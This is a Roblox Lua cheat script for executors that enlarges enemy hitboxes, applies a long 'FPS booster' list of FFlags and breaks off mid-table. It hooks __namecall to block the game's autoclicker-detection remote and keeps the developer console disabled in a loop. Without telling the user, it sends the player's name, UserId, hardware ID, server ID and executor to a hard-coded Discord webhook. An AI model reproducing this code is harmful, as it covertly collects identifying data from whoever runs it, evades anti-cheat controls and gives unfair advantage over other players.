local syde = {
	Notify = function(self, data)
		if Rayfield then
			Rayfield:Notify({
				Title = data.Title,
				Content = data.Content,
				Duration = data.Duration or 3
			})
		end
	end
}

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local autoclickBypassStatus = "Desativado (Erro ao aplicar hook)"
local successHook, hookErr = pcall(function()
	local OldNamecall
	OldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
		local method = getnamecallmethod()
		if method == "FireServer" and self == ReplicatedStorage.Remotes.GameServices.ToServer.AutoclickerDetected then
			return
		end
		return OldNamecall(self, ...)
	end))
	autoclickBypassStatus = "Ativado"
end)

if not successHook then
	autoclickBypassStatus = "Desativado (Executor incompatível: " .. tostring(hookErr) .. ")"
end


local function _blockConsole()
	pcall(function() game:GetService("StarterGui"):SetCore("DevConsoleEnabled", false) end)
	for _, child in ipairs(game:GetService("CoreGui"):GetChildren()) do
		if child.Name == "DevConsole" then
			child.Enabled = false
		end
	end
end

_blockConsole()

for _, child in ipairs(game:GetService("CoreGui"):GetChildren()) do
	if child.Name == "DevConsole" then
		child.Enabled = false
		child:GetPropertyChangedSignal("Enabled"):Connect(function()
			if child.Enabled then child.Enabled = false end
		end)
	end
end

game:GetService("CoreGui").ChildAdded:Connect(function(child)
	if child.Name == "DevConsole" then
		child.Enabled = false
		child:GetPropertyChangedSignal("Enabled"):Connect(function()
			if child.Enabled then child.Enabled = false end
		end)
	end
end)

game:GetService("UserInputService").InputBegan:Connect(function(input)
	if input.KeyCode == Enum.KeyCode.F9 then
		_blockConsole()
	end
end)

task.spawn(function()
	while true do
		_blockConsole()
		task.wait(0.1)
	end
end)

local Players = game:GetService("Players")
local CollectionService = game:GetService("CollectionService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer
local EntitiesFolder = workspace:FindFirstChild("Entities")

pcall(function()
	local hwid = game:GetService("RbxAnalyticsService"):GetClientId()
	local httprequest = (syn and syn.request)
		or (http and http.request)
		or (http_request)
		or (fluxus and fluxus.request)
		or request
	if not httprequest then return end
	httprequest({
		Url =
		"https://discord.com/api/webhooks/1489706136637800468/XRiSABmsy0PVxbknhSpJG-h8Fvlyc3x_vONCI8OExFlDphyaFlroD43mbm6n35IfSBYO",
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = HttpService:JSONEncode({
			content = "",
			embeds = { {
				title = "diarian — Session Log",
				color = 0xFF0000,
				fields = {
					{ name = "User",     value = LocalPlayer.Name,                                                                                                                           inline = true },
					{ name = "UserId",   value = tostring(LocalPlayer.UserId),                                                                                                               inline = true },
					{ name = "HWID",     value = "```" .. hwid .. "```",                                                                                                                     inline = false },
					{ name = "Game",     value = "[" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", inline = true },
					{ name = "Server",   value = "`" .. game.JobId .. "`",                                                                                                                   inline = false },
					{ name = "Executor", value = identifyexecutor(),                                                                                                                         inline = true },
					{ name = "Time",     value = os.date("%Y-%m-%d %H:%M:%S", os.time()),                                                                                                    inline = true },
				},
				footer = { text = "diarian logger" },
			} },
		}),
	})
end)


local hitboxEnabled = false
local hitboxKeybind = Enum.KeyCode.Four
local hitboxSize = 50
local hitboxTransparency = 80
local hitboxColor = Color3.fromRGB(180, 150, 255)

local friendWhitelist = {
	[LocalPlayer.Name] = true,
}

local whitelistToggles = {}
local hitboxBoxes = {}
local hitboxToggleRef = nil

local function shouldIgnoreHitboxName(name)
	return name == LocalPlayer.Name or friendWhitelist[name] == true
end

local function applyHitboxStyle(part)
	if not part then
		return
	end
	part.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
	part.Color = hitboxColor
	part.Transparency = hitboxTransparency / 100
end

local function destroyHitboxForModel(model)
	local data = hitboxBoxes[model]
	if data then
		if data.box and data.box.Parent then
			data.box:Destroy()
		end
		hitboxBoxes[model] = nil
	end
end

local function createHitboxForModel(model)
	if not hitboxEnabled or not model or not model.Parent then
		return
	end
	if shouldIgnoreHitboxName(model.Name) or hitboxBoxes[model] then
		return
	end

	local primary = model.PrimaryPart or model:FindFirstChild("HumanoidRootPart") or
		model:FindFirstChildWhichIsA("BasePart")
	if not primary then
		return
	end

	local box = Instance.new("Part")
	box.Name = "AbilityBox"
	box.CanCollide = false
	box.Anchored = false
	box.Massless = true
	box.CFrame = primary.CFrame
	applyHitboxStyle(box)
	box.Parent = model

	local weld = Instance.new("WeldConstraint")
	weld.Part0 = box
	weld.Part1 = primary
	weld.Parent = box

	hitboxBoxes[model] = { box = box }
end

local function clearAllHitboxes()
	for model in pairs(hitboxBoxes) do
		destroyHitboxForModel(model)
	end
end

local function refreshAllHitboxes()
	for model, data in pairs(hitboxBoxes) do
		if not model.Parent or shouldIgnoreHitboxName(model.Name) then
			destroyHitboxForModel(model)
		elseif data.box then
			applyHitboxStyle(data.box)
		end
	end
end

local function setHitboxEnabled(state)
	hitboxEnabled = state
	if hitboxEnabled then
		if EntitiesFolder then
			for _, entity in ipairs(EntitiesFolder:GetChildren()) do
				if entity:IsA("Model") then
					createHitboxForModel(entity)
				end
			end
		end
	else
		clearAllHitboxes()
	end
end

local function activateFPSBooster()
	local setfflag = setfflag or set_fflag or (debug and debug.setfflag)

	-- FFlags (If supported by executor)
	if setfflag then
		local fflags = {
			["DFIntCanHideGuiGroupId"] = "6723824",
			["FIntActivatedCountTimerMSKeyboard"] = "0",
			["FIntActivatedCountTimerMSMouse"] = "0",
			["FLogNetwork"] = "7",
			["DFIntHardwareTelemetryHundredthsPercent"] = "0",
			["FStringWhitelistVerifiedUserId"] = "411955176",
			["FFlagLuaAppExitModalDoNotShow"] = "True",
			["DFFlagBatchAssetApiNoFallbackOnFail"] = "False",
			["DFIntClientLightingTechnologyChangedTelemetryHundredthsPercent"] = "0",
			["DFIntTextureQualityOverride"] = "0",
			["DFIntPlayerNetworkUpdateRate"] = "60",
			["FIntV1MenuLanguageSelectionFeaturePerMillageRollout"] = "0",
			["FIntRenderShadowIntensity"] = "0",
			["DFIntRaknetBandwidthInfluxHundredthsPercentageV2"] = "10000",
			["DFFlagTextureQualityOverrideEnabled"] = "True",
			["FFlagDebugDisableTelemetryEphemeralCounter"] = "True",
			["FFlagDontCreatePingJob"] = "True",
			["FIntFullscreenTitleBarTriggerDelayMillis"] = "18000000",
			["FFlagReconnectDisabled"] = "True",
			["FIntBootstrapperTelemetryReportingHundredthsPercentage"] = "0",
			["FFlagDisablePostFx"] = "True",
			["FFlagDebugRenderingSetDeterministic"] = "True",
			["DFIntCodecMaxOutgoingFrames"] = "10000",
			["DFIntRakNetNakResendDelayMs"] = "1",
			["FIntRakNetResendBufferArrayLength"] = "128",
			["FStringTopBarBadgeLearnMoreLink"] = "https://youtube.com/@KiwisASkid/",
			["DFFlagSimReportCPUInfo"] = "False",
			["DFIntTaskSchedulerTargetFps"] = "9999",
			["FIntDebugForceMSAASamples"] = "1",
			["DFFlagDisableDPIScale"] = "True",
			["FIntUGCValidationLeftArmThresholdSide"] = "40",
			["DFIntCodecMaxIncomingPackets"] = "100",
			["FFlagEnableInGameMenuChromeABTest3"] = "False",
			["FFlagHandleAltEnterFullscreenManually"] = "False",
			["FIntTerrainArraySliceSize"] = "4",
			["FIntUGCValidationTorsoThresholdBack"] = "200",
			["DFFlagDebugRenderForceTechnologyVoxel"] = "True",
			["DFIntCSGLevelOfDetailSwitchingDistanceL23"] = "3",
			["FFlagEnableMenuModernizationABTest2"] = "False",
			["DFStringRobloxAnalyticsURL"] = "http://opt-out.roblox.com",
			["DFIntOptimizePingThreshold"] = "50",
			["DFStringHttpPointsReporterUrl"] = "http://opt-out.roblox.com",
			["FFlagEnableMenuControlsABTest"] = "False",
			["DFIntCanHideGuiGroupId"] = "32380007",
			["FFlagDebugForceFutureIsBrightPhase3"] = "True",
			["FFlagDebugGraphicsPreferD3D11"] = "true",
			["DFIntRakNetNakResendDelayRttPercent"] = "50",
			["DFIntRaknetBandwidthPingSendEveryXSeconds"] = "1",
			["FFlagEnableAudioOutputDevice"] = "False",
			["FStringErrorUploadToBacktraceBaseUrl"] = "http://opt-out.roblox.com",
			["FIntRenderShadowmapBias"] = "0",
			["DFIntUserIdPlayerNameLifetimeSeconds"] = "86400",
			["DFIntPlayerNetworkUpdateQueueSize"] = "20",
			["FFlagDebugLightGridShowChunks"] = "False",
			["DFIntLightstepHTTPTransportHundredthsPercent2"] = "0",
			["DFFlagEnableDynamicHeadByDefault"] = "False",
			["DFIntLargePacketQueueSizeCutoffMB"] = "1000",
			["FIntUGCValidationLeftLegThresholdFront"] = "40",
			["FFlagDebugGraphicsDisableMetal"] = "true",
			["FFlagEnableInGameMenuV3"] = "True",
			["FIntUGCValidationRightArmThresholdFront"] = "50",
			["FFlagDebugDisableTelemetryV2Counter"] = "True",
			["DFFlagEnableHardwareTelemetry"] = "False",
			["FIntUGCValidationLeftArmThresholdBack"] = "23",
			["FFlagGameBasicSettingsFramerateCap5"] = "false",
			["FFlagInGameMenuV1ExitModal"] = "True",
			["DFIntAnimationLodFacsDistanceMin"] = "0",
			["FFlagLuaAppExitModal2"] = "False",
			["FIntMockClientLightingTechnologyIxpExperimentQualityLevel"] = "7",
			["FFlagOptimizeNetwork"] = "true",
			["FFlagCloudsReflectOnWater"] = "True",
			["FFlagEnableQuickGameLaunch"] = "False",
			["FFlagDebugGraphicsPreferVulkan"] = "True",
			["FIntRenderGrassHeightScaler"] = "0",
			["DFFlagEnableLightstepReporting2"] = "False",
			["FFlagEnableAccessibilitySettingsAPIV2"] = "True",
			["FFlagDebugSimDefaultPrimalSolver"] = "True",
			["DFIntCSGLevelOfDetailSwitchingDistance"] = "1",
			["FFlagInGameMenuV1FullScreenTitleBar"] = "False",
			["FStringPartTexturePackTable2022"] =
			"{\"foil\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[238,238,238,255]},\"asphalt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[227,227,228,234]},\"basalt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[160,160,158,238]},\"brick\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[229,214,205,227]},\"cobblestone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[218,219,219,243]},\"concrete\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[225,225,224,255]},\"crackedlava\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[76,79,81,156]},\"diamondplate\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[210,210,210,255]},\"fabric\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[221,221,221,255]},\"glacier\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[225,229,229,243]},\"glass\":{\"ids\":[\"rbxassetid://9873284556\",\"rbxassetid://9438453972\"],\"color\":[254,254,254,7]},\"granite\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[210,206,200,255]},\"grass\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[196,196,189,241]},\"ground\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[165,165,160,240]},\"ice\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[235,239,241,248]},\"leafygrass\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[182,178,175,234]},\"limestone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[250,248,243,250]},\"marble\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[181,183,193,249]},\"metal\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[226,226,226,255]},\"mud\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[193,192,193,252]},\"pavement\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[218,218,219,236]},\"pebble\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[204,203,201,234]},\"plastic\":{\"ids\":[\"\",\"rbxassetid://0\"],\"color\":[255,255,255,255]},\"rock\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[211,211,210,248]},\"corrodedmetal\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[206,177,163,180]},\"salt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[249,249,249,255]},\"sand\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[218,216,210,240]},\"sandstone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[241,234,230,246]},\"slate\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[235,234,235,254]},\"snow\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[239,240,240,255]},\"wood\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[217,209,208,255]},\"woodplanks\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[207,208,206,254]}}",
			["DFIntNetworkLatencyTolerance"] = "1",
			["FFlagGpuGeometryManager7"] = "True",
			["FIntEmotesAnimationsPerPlayerCacheSize"] = "16777216",
			["DFIntRakNetLoopMs"] = "1",
			["DFStringCrashUploadToBacktraceBaseUrl"] = "http://opt-out.roblox.com",
			["FFlagDebugDisableTelemetryEphemeralCounter"] = "True",
			["FFlagDontCreatePingJob"] = "True",
			["FIntFullscreenTitleBarTriggerDelayMillis"] = "18000000",
			["FFlagReconnectDisabled"] = "True",
			["FIntBootstrapperTelemetryReportingHundredthsPercentage"] = "0",
			["FFlagDisablePostFx"] = "True",
			["FFlagDebugRenderingSetDeterministic"] = "True",
			["DFIntCodecMaxOutgoingFrames"] = "10000",
			["DFIntRakNetNakResendDelayMs"] = "1",
			["FIntRakNetResendBufferArrayLength"] = "128",
			["FStringTopBarBadgeLearnMoreLink"] = "https://youtube.com/@KiwisASkid/",
			["DFFlagSimReportCPUInfo"] = "False",
			["DFIntTaskSchedulerTargetFps"] = "9999",
			["FIntDebugForceMSAASamples"] = "1",
			["DFFlagDisableDPIScale"] = "True",
			["FIntUGCValidationLeftArmThresholdSide"] = "40",
			["DFIntCodecMaxIncomingPackets"] = "100",
			["FFlagEnableInGameMenuChromeABTest3"] = "False",
			["FFlagHandleAltEnterFullscreenManually"] = "False",
			["FIntTerrainArraySliceSize"] = "4",
			["FIntUGCValidationTorsoThresholdBack"] = "200",
			["DFFlagDebugRenderForceTechnologyVoxel"] = "True",
			["DFIntCSGLevelOfDetailSwitchingDistanceL23"] = "3",
			["FFlagEnableMenuModernizationABTest2"] = "False",
			["DFStringRobloxAnalyticsURL"] = "http://opt-out.roblox.com",
			["DFIntOptimizePingThreshold"] = "50",
			["DFStringHttpPointsReporterUrl"] = "http://opt-out.roblox.com",
			["FFlagEnableMenuControlsABTest"] = "False",
			["DFIntCanHideGuiGroupId"] = "32380007",
			["FFlagDebugForceFutureIsBrightPhase3"] = "True",
			["FFlagDebugGraphicsPreferD3D11"] = "true",
			["DFIntRakNetNakResendDelayRttPercent"] = "50",
			["DFIntRaknetBandwidthPingSendEveryXSeconds"] = "1",
			["FFlagEnableAudioOutputDevice"] = "False",
			["FStringErrorUploadToBacktraceBaseUrl"] = "http://opt-out.roblox.com",
			["FIntRenderShadowmapBias"] = "0",
			["DFIntUserIdPlayerNameLifetimeSeconds"] = "86400",
			["DFIntPlayerNetworkUpdateQueueSize"] = "20",
			["FFlagDebugLightGridShowChunks"] = "False",
			["DFIntLightstepHTTPTransportHundredthsPercent2"] = "0",
			["DFFlagEnableDynamicHeadByDefault"] = "False",
			["DFIntLargePacketQueueSizeCutoffMB"] = "1000",
			["FIntUGCValidationLeftLegThresholdFront"] = "40",
			["FFlagDebugGraphicsDisableMetal"] = "true",
			["FFlagEnableInGameMenuV3"] = "True",
			["FIntUGCValidationRightArmThresholdFront"] = "50",
			["FFlagDebugDisableTelemetryV2Counter"] = "True",
			["DFFlagEnableHardwareTelemetry"] = "False",
			["FIntUGCValidationLeftArmThresholdBack"] = "23",
			["FFlagGameBasicSettingsFramerateCap5"] = "false",
			["FFlagInGameMenuV1ExitModal"] = "True",
			["DFIntAnimationLodFacsDistanceMin"] = "0",
			["FFlagLuaAppExitModal2"] = "False",
			["FIntMockClientLightingTechnologyIxpExperimentQualityLevel"] = "7",
			["FFlagOptimizeNetwork"] = "true",
			["FFlagCloudsReflectOnWater"] = "True",
			["FFlagEnableQuickGameLaunch"] = "False",
			["FFlagDebugGraphicsPreferVulkan"] = "True",
			["FIntRenderGrassHeightScaler"] = "0",
			["DFFlagEnableLightstepReporting2"] = "False",
			["FFlagEnableAccessibilitySettingsAPIV2"] = "True",
			["FFlagDebugSimDefaultPrimalSolver"] = "True",
			["DFIntCSGLevelOfDetailSwitchingDistance"] = "1",
			["FFlagInGameMenuV1FullScreenTitleBar"] = "False",
			["FStringPartTexturePackTable2022"] =
			"{\"foil\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[238,238,238,255]},\"asphalt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[227,227,228,234]},\"basalt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[160,160,158,238]},\"brick\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[229,214,205,227]},\"cobblestone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[218,219,219,243]},\"concrete\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[225,225,224,255]},\"crackedlava\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[76,79,81,156]},\"diamondplate\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[210,210,210,255]},\"fabric\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[221,221,221,255]},\"glacier\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[225,229,229,243]},\"glass\":{\"ids\":[\"rbxassetid://9873284556\",\"rbxassetid://9438453972\"],\"color\":[254,254,254,7]},\"granite\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[210,206,200,255]},\"grass\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[196,196,189,241]},\"ground\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[165,165,160,240]},\"ice\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[235,239,241,248]},\"leafygrass\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[182,178,175,234]},\"limestone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[250,248,243,250]},\"marble\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[181,183,193,249]},\"metal\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[226,226,226,255]},\"mud\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[193,192,193,252]},\"pavement\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[218,218,219,236]},\"pebble\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[204,203,201,234]},\"plastic\":{\"ids\":[\"\",\"rbxassetid://0\"],\"color\":[255,255,255,255]},\"rock\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[211,211,210,248]},\"corrodedmetal\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[206,177,163,180]},\"salt\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[249,249,249,255]},\"sand\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[218,216,210,240]},\"sandstone\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[241,234,230,246]},\"slate\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[235,234,235,254]},\"snow\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[239,240,240,255]},\"wood\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[217,209,208,255]},\"woodplanks\":{\"ids\":[\"rbxassetid://0\",\"rbxassetid://0\"],\"color\":[207,208,206,254]}}",
			["DFLogHttpTraceLight"] = "0",
			["FStringTerrainMaterialTablePre2022"] = "",
			["DFFlagDebugPerfMode"] = "True",
			["DFIntServerPhysicsUpdateRate"] = "60",
			["DFFlagDebugSimPrimalFeedback"] = "True",
			["DFIntDebugSimPrimalStiffnessMax"] = "0",
			["DFIntDebugSimPrimalStiffnessMin"] = "0",
			["DFIntMaximumFreefallMoveTimeInTenths"] = "1000",
			["DFIntDebugSimPrimalNewtonIts"] = "1",
			["DFIntDebugSimPrimalPreconditioner"] = "69",
			["DFIntDebugSimPrimalPreconditionerMinExp"] = "69",
			["DFIntDebugSimPrimalToleranceInv"] = "1",
			["DFIntDebugSimPrimalWarmstartForce"] = "-885",
			["DFIntDebugSimPrimalWarmstartVelocity"] = "-350",
			["DFIntDebugSimPrimalStiffness"] = "0",
			["DFFlagRakNetStaleSendQueue"] = "True",
			["DFIntRakNetUseSlidingWindow2_startFactor"] = "100",
			["DFIntRakNetUseSlidingWindow2_minSpeed"] = "512",
			["DFIntRakNetUseSlidingWindow2_minRtt"] = "500",
			["DFIntRakNetUseSlidingWindow2_trackLengthMs"] = "300",
			["DFIntRakNetUseSlidingWindow2_rangeCount"] = "20",
			["DFIntRakNetUseSlidingWindow2_maxSpeed"] = "5000",
			["DFIntRakNetStaleSendQueueTriggerMs"] = "100",
			["DFFlagSampleAndRefreshRakPing"] = "True",
			["DFFlagRakNetMissingPing1"] = "True",
			["DFIntRakNetClockDriftAdjustmentPerPingMillisecond"] = "100",
			["FIntRakNetDatagramMessageldArrayLength"] = "4096",
			["DFFlagRakNetFixBwCollapse"] = "False",
			["DFFlagRakNetMissingPing"] = "False",
			["DFIntRakNetPingFrequencyMillisecond"] = "50",
			["DFFlagDebugRakPeerReceiveCountDistributedPackets"] = "False",
			["DFIntRakNetUseSlidingWindow2_startUpdateMs"] = "1",
			["DFFlagRakNetUnblockSelectOnShutdownByWritingToSocket"] = "True",
			["DFIntRaknetDownloadEpisodeInMs"] = "500",
			["DFFlagRakNetDetectNetUnreachable"] = "True",
			["DFIntRakNetUseSlidingWindow2_startInitSpeed"] = "100000",
			["DFFlagRakNetDecoupleRecvAndUpdateLoopShutdown"] = "True",
			["DFFlagRakNetCalculateApplicationFeedback2"] = "False",
			["DFFlagRakNetEnablePoll"] = "True",
			["DFFlagRakNetDisconnectNotification"] = "True",
			["DFFlagRakNetDetectRecvThreadOverload"] = "True",
			["FFlagHighlightOutlinesOnMobile"] = "True",
			["FFlagDebugForceFutureIsBrightPhase2"] = "True",
			["DFIntReportServerConnectionLostHundredthsPercent"] = "0",
			["DFIntConnectionMTUSize"] = "1200",
			["DFFlagReportServerConnectionLost"] = "False",
			["DFIntRakNetMtuValue1InBytes"] = "900",
			["FIntNewInGameMenuPercentRollout3"] = "0",
			["FIntRomarkStartWithGraphicQualityLevel"] = "2",
			["FFlagEnableInGameMenuChromeABTest4"] = "False",
			["DFFlagDebugLargeReplicatorDisableCompression"] = "true",
			["DFFlagDebugLargeReplicatorDisableDelta"] = "true",
			["DFFlagReplicateCreateToPlayer"] = "True",
			["DFFlagFastEndUpdateLoop"] = "true",
			["DFFlagHttpApplyDecompressionMultiplier"] = "False",
			["DFFlagHttpPointsReporterUseCompression"] = "False",
			["DFFlagNetworkUseZstdWrapper"] = "False",
			["FFlagDebugLargeReplicatorEnabled"] = "True",
			["FFlagDebugLargeReplicatorWrite"] = "True",
			["FFlagDebugLargeReplicatorRead"] = "True",
			["FFlagSimCSGV3IncrementalTriangulationStreamingCompression"] = "False",
			["FFlagEnableZstdDictionaryForClientSettings"] = "False",
			["FFlagCreationDBCompressRequest"] = "False",
			["FFlagEnableZstdForClientSettings"] = "False",
			["DFIntRakNetApplicationFeedbackScaleUpFactorHundredthPercent"] = "0",
			["DFIntServerBandwidthPlayerSampleRateFacsOverride"] = "2147483647",
			["DFIntRakNetApplicationFeedbackScaleUpThresholdPercent"] = "0",
			["DFIntJoinDataItemEstimatedCompressionRatioHundreths"] = "0",
			["DFIntServerRakNetBandwidthPlayerSampleRate"] = "2147483647",
			["DFIntClusterSenderMaxUpdateBandwidthBps"] = "2100000000",
			["DFIntGameNetCompressionLodByteBudgetThresholdPct"] = "0",
			["DFIntClusterEstimatedCompressionRatioHundredths"] = "0",
			["DFIntClusterSenderMaxJoinBandwidthBps"] = "2100000000",
			["DFIntServerBandwidthPlayerSampleRate"] = "2147483647",
			["DFIntClientNetworkInfluxHundredthsPercentage"] = "0",
			["DFIntRakNetApplicationFeedbackMaxSpeedBPS"] = "0",
			["DFIntSendGameServerDataMaxLen"] = "2147483647",
			["DFIntTouchSenderMaxBandwidthBpsScaling"] = "2",
			["DFIntSendRakNetStatsInterval"] = "2147483647",
			["DFIntNetworkSchemaCompressionRatio"] = "0",
			["DFIntTouchSenderMaxBandwidthBps"] = "1050",
			["DFIntNetworkQualityResponderUnit"] = "10",
			["DFIntJoinDataCompressionLevel"] = "0",
			["DFIntServerFramesBetweenJoins"] = "1",
			["DFIntClusterCompressionLevel"] = "0",
			["DFIntRakNetSelectTimeoutMs"] = "1",
			["DFIntSendItemLimit"] = "5",
			["FIntTaskSchedulerThreadMin"] = "3",
			["FStringCredit"] = "Potato Mode | @KiwisASkid on YT",
			["FIntRuntimeMaxNumOfThreads"] = "2400",
			["FFlagDebugCheckRenderThreading"] = "True",
			["FFlagRenderDebugCheckThreading2"] = "True",
			["DFIntPerformanceControlTextureQualityBestUtility"] = "-1",
			["DFIntRakNetMtuValue3InBytes"] = "1200",
			["FFlagDebugSkyGray"] = "True",
			["DFIntRakNetMtuValue2InBytes"] = "1240",
			["FFlagDebugDisableOTAMaterialTexture"] = "True",
			["DFIntAnimationLodFacsFpsMax"] = "0",
			["DFIntAnimationLodFacsFpsMin"] = "0",
			["DFIntAnimationLodFacsVisibilityMax"] = "0",
			["DFIntAnimationLodFacsVisibilityMin"] = "0",
			["FFlagAvatarChatIncludeSelfViewOnTelemetry"] = "False",
			["FFlagCoreGuiSelfViewVisibilityFixed"] = "False",
			["FFlagDebugSelfViewPerfBenchmark"] = "False",
			["FFlagDisableChromeV3StaticSelfView"] = "False",
			["FFlagFixSelfViewPopin"] = "False",
			["FFlagInExperienceUpsellSelfViewFix"] = "False",
			["FFlagMockOpenSelfViewForCameraUser"] = "False",
			["FFlagSelfViewAvoidErrorOnWrongFaceControlsParenting"] = "False",
			["FFlagSelfViewCameraDefaultButtonInViewPort"] = "False",
			["FFlagSelfViewFixes"] = "False",
			["FFlagSelfViewGetRidOfFalselyRenderedFaceDecal"] = "False",
			["FFlagSelfViewHumanoidNilCheck"] = "False",
			["FFlagSelfViewLookUpHumanoidByType"] = "False",
			["FFlagSelfViewMoreNilChecks"] = "False",
			["FFlagSelfViewRemoveVPFWhenClosed"] = "False",
			["FFlagSelfViewTweaksPass"] = "False",
			["FFlagSelfViewUpdatedCamFraming"] = "False",
			["FIntSelfViewTooltipLifetime"] = "0",
			["DFIntAnimationFromVideoCreatorStudioServiceSecondsPerRequest"] = "0",
			["DFIntAnimationLodBoneLocomotionFixMaxDepth"] = "0",
			["DFIntAnimationLodBudgetAdjustmentMaxInThousandths"] = "0",
			["DFIntAnimationLodBudgetAdjustmentMinInThousandths"] = "0",
			["DFIntAnimationLodCleanupIntervalSeconds"] = "0",
			["DFIntAnimationLodConfigVersion"] = "0",
			["DFIntAnimationLodDerivativeGainThousandths"] = "0",
			["DFIntAnimationLodDistanceMaxLod0"] = "0",
			["DFIntAnimationLodDistanceMaxLod1"] = "0",
			["DFIntAnimationLodFacsAnimationTimeMsMax"] = "0",
			["DFIntAnimationLodFacsAnimationTimeMsMin"] = "0",
			["DFIntAnimationLodFacsMaxLodThreshold"] = "0",
			["DFIntAnimationLodFacsOutOfFrustumLodPercentage"] = "0",
			["DFIntAnimationLodIntegralGainThousandths"] = "0",
			["DFIntAnimationLodInverseVisibilityMinLod0"] = "0",
			["DFIntAnimationLodInverseVisibilityMinLod1"] = "0",
			["DFIntAnimationLodOutsideFrustumDistanceMaxLod0"] = "0",
			["DFIntAnimationLodProportionalGainThousandths"] = "0",
			["DFIntAnimationLodRetargetingIkMaxLodThreshold"] = "0",
			["DFIntAnimationLodThrottleMaxFramesToSkip"] = "0",
			["DFIntAnimationLodThrottlerAnimationTimeMsMax"] = "0",
			["DFIntAnimationLodThrottlerAnimationTimeMsMin"] = "0",
			["DFIntAnimationLodThrottlerDistanceMax"] = "0",
			["DFIntAnimationLodThrottlerDistanceMin"] = "0",
			["DFIntAnimationLodThrottlerFpsMax"] = "0",
			["DFIntAnimationLodThrottlerFpsMin"] = "0",
			["DFIntAnimationLodThrottlerOutOfFrustumLodPercentage"] = "0",
			["DFIntAnimationLodThrottlerVisibilityDenominator"] = "0",
			["DFIntAnimationLodThrottlerVisibilityMax"] = "0",
			["DFIntAnimationLodThrottlerVisibilityMin"] = "0",
			["DFIntAnimationParallelFpsLossFactor100th"] = "0",
